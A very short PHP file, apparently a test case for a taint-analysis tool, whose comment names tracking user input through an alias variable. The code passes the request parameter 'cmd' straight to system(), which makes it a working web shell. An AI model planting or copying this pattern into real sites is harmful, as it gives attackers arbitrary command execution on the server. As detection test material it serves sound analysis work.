<?php
// superglobal survival through an alias variable
$v = $_REQUEST;
system(trim($v['cmd']));
